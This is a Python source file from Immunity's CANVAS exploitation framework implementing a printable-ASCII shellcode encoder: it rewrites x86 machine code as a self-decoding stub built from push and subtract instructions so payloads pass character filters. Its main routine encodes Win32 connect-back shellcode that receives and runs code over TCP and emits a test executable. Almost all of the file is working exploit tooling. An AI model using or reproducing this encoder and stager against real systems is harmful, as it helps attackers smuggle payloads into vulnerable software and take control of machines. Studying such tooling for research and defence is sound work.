#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2007
#http://www.immunityinc.com/CANVAS/ for more information

NOTES="""
Interesting links. Our method is slightly different from all of these,
of course.

http://archives.neohapsis.com/archives/vuln-dev/2000-q4/0195.html
http://www.metasploit.com/sc/x86_fnstenv_xor_byte.asm
http://www.hick.org/code/skape/nologin/encode/encode.c
http://www.groar.org/expl/intermediate/p57-0x0f.txt
http://www.securiteam.com/exploits/5JP0M2KBPE.html

"""

import random
import sys,os

if '.' not in sys.path: sys.path.append('.')

from exploitutils import *
from MOSDEF import mosdef

#set the seed to something static for debugging
#random.seed(1)
random.seed(os.getpid())

def strisprint(str):
    for i in str:
        if not isprint(i):
            return 0
    return 1

def printablelength(str):
    ret=0
    for i in str:
        if not isprint(i):
            return ret
        ret+=1
    return ret

class intelprintableencoder:
    """
    Encodes a shellcode as a printable string
    can take Windows or known registers as special cases
    in order to do a jmp esp (which is necessary at the end of the
    shellcode)
    
    requires a executable stack (bad - we can do xor mode later)
    return, call %reg, geteip and self-modify, or fallthrough are your options
    """
    def __init__(self):
        self.order=intel_order
        self.unorder=istr2int
        self.badchars='' #set to especially bad chars
        self.value=''
        self.code=''
        self.eaxset=0
        self.eax=0
        self.espmodification=0
        self.goodchars='' #inited in encode
        return

    def assemble(self,str):
        return mosdef.assemble(str,'x86')

    def run(self,filename):
        return self.encode(open(filename,'r').read())

    def setbadchars(self,badchars):
        self.badchars=badchars
        return

    def printablelength(self,data):
        length=printablelength(data)
        for c in self.badchars:
            if c in data[:length]:
                return 0
        return length
    
    def encode(self,rawshellcode):
        self.goodchars=range(0x20,0x7f)
        for c in self.badchars:
            if ord(c) in self.goodchars:
                self.goodchars.remove(ord(c))
        while (len(rawshellcode)%4)!=0:
            rawshellcode+='A'
        encodedshellcode=''
        for i in range(0,len(rawshellcode),4):
            L=struct.unpack('<L',rawshellcode[i:i+4])[0]
            HIGH=((L&0xf0f0f0f0)>>4)+0x41414141
            LOW=(L&0x0f0f0f0f)+0x41414141
            encodedshellcode+=struct.pack('<LL',HIGH,LOW)
        encodedshellcode+='QQQQ' #marks the end of the encoded shellcode
        print 'encodedshellcode=\n%s'%(encodedshellcode)
        decoder='''    movl %esi,%edi
    movl $0x41414141,%ebx
decodeloop:
    lodsl
    subl %ebx,%eax
    testb $0x10,%al
    jnz done
    shl $0x4,%eax
    movl %eax,%edx
    lodsl
    subl %ebx,%eax
    addl %edx,%eax
    stosl
    jmp decodeloop
done:'''
        code=mosdef.assemble(decoder,'x86')
        while len(code)%4!=0:
            code+='\x90'
        self.espmodification+=len(code) #add the length of the decoded decoder
        data=reversestring(code)
        while data!='':
            length=self.printablelength(data[:4])
            if length==4:
                self.push(data[:length])
                data=data[length:]
                continue
            elif self.sub_and_push(data[:4]):
                data=data[4:]
                continue
            else:
                print 'Could not handle data: %s'%(prettyprint(data[:4]))
                return ''
        code=mosdef.assemble(self.code,'x86')
        while len(code)%4!=0:
            code+='A'
        self.value+=code
        self.value+='A'*self.espmodification #this is where the decoded decoder will be put
        self.espmodification+=len(code) #add the length of the encoded decoder
        if self.espmodification!=0:
            prepend='    pushl %esp\n    popl %eax\n'
            self.eax=0
            array=self.subval_split(self.espmodification+24) #this piece of code should always have a length of 24, so we add that
            for i in array:
                prepend+='    sub $0x%8.8x,%%eax\n'%(i)
                self.eax=csub(self.eax,i)
            prepend+='    pushl %eax\n    pop %esp\n'
            prepend+='    pushl %esp\n    pop %esi\n' #restore esi from esp
            code=mosdef.assemble(prepend,'x86')
            while len(code)%4!=0:
                code+='A'
            if len(code)!=24: #checking if length is always 24
                print 'ERROR: espmodification has a different length than expected (%d)'%(len(code))
                sys.exit(2)
            self.value=code+self.value
            self.code=prepend+self.code
        print 'self.code=\n%s'%(self.code)
        self.value+=encodedshellcode
        return self.value

    def push(self,str):
        length=len(str)
        if length!=4:
            str+='A'*(4-length) #should not happen!
        dword=str2bigendian(str)
        self.code+='    push $0x%8.8x\n'%(uint32(dword))
        return 1
    
    def sub_and_push(self,data):
        if len(data)%4!=0:
            data+='\x90'*(4-(len(data)%4)) #should not happen!
        data=reversestring(data)
        if not self.eaxset:
            self.code+='    push $0x41414141\n    popl %eax\n'
            self.eax=0x41414141
            self.eaxset=1
        wanted=self.unorder(data)
        if wanted==self.eax:
            self.code+='    push %eax\n'
            return 1
        for i in self.subval_split(wanted):
            self.code+='    sub $0x%8.8x,%%eax\n'%(i)
            self.eax=csub(self.eax,i)
        if uint32(self.eax)!=uint32(wanted):
            print 'ERROR: eax is not correct %8.8x versus %8.8x'%(self.eax,wanted)
        self.code+='    pushl %eax\n'
        return 1

    def subval_split(self,subval):
        j=0
        failed=0
        #print "Encoder is Splitting: %8.8x"%subval
        wantedbytes=[0]*4
        wantedbytes[0]=subval&0xff
        wantedbytes[1]=(subval&0xff00)>>8
        wantedbytes[2]=(subval&0xff0000)>>16
        wantedbytes[3]=(subval&0xff000000L)>>24
        #print "Wantedbytes=%s"%wantedbytes
        splitbytes=[]
        numberSet=[0]*3
        eax=self.eax
        carry=0
        for bit in range(0,4):
            currentByte=(eax>>(bit*8))&0xff
            desiredByte=(subval>>(bit*8))&0xff
            found=0
            #print "Doing byte %2.2x"%currentByte
            for first in self.goodchars:
                if found: break
                for second in self.goodchars:
                    if found: break
                    for third in self.goodchars:
                        if found: break
                        rollover=first
                        rollover+=second
                        rollover+=third
                        rollover+=desiredByte
                        rollover+=carry
                        actual=rollover&0xff
                        if actual==currentByte:
                            numberSet[0]+=first<<(bit*8)
                            numberSet[1]+=second<<(bit*8)
                            numberSet[2]+=third<<(bit*8)
                            carry=(rollover&0xff00)>>8
                            found=1
            if found:
                pass
                #print "Found byte: %2.2x"%currentByte
        return numberSet

def usage():
    print """
    Printable Encoder v1.1, Immunity, Inc.
    usage: printable.py -f shellcode
    """
    sys.exit(2)

if __name__ =='__main__':
    import getopt
    print 'Running Printable Encoder v1.1'
    print 'Copyright Dave Aitel'
    app=intelprintableencoder()
    try:
        (opts,args)=getopt.getopt(sys.argv[1:],'f:')
    except getopt.GetoptError:
        usage()   
    for o,a in opts:
        if o in ['-f']:
            port=a
            filename=a
    from shellcode import shellcodeGenerator
    sc=shellcodeGenerator.win32()
    sc.addAttr('findeipnoesp',{'subespval':1000})
    sc.addAttr('tcpconnect', {'port' :12345,'ipaddress':'127.0.0.1'})
    sc.addAttr('CreateThreadRecvExecWin32',{'socketreg':'FDSPOT'}) #MOSDEF
    sc.addAttr('ExitThread',None)
    orig=sc.get()
    app.setbadchars(' &')
    data=app.encode(orig)
    import curses.ascii
    print '%d: length=%d (from %d) Data=%s'%(strisprint(data),len(data),len(orig),data)
    from MOSDEF import makeexe
    makeexe.makelinuxexe('\xcc'+data+'\xcc',filename='printtest.out')
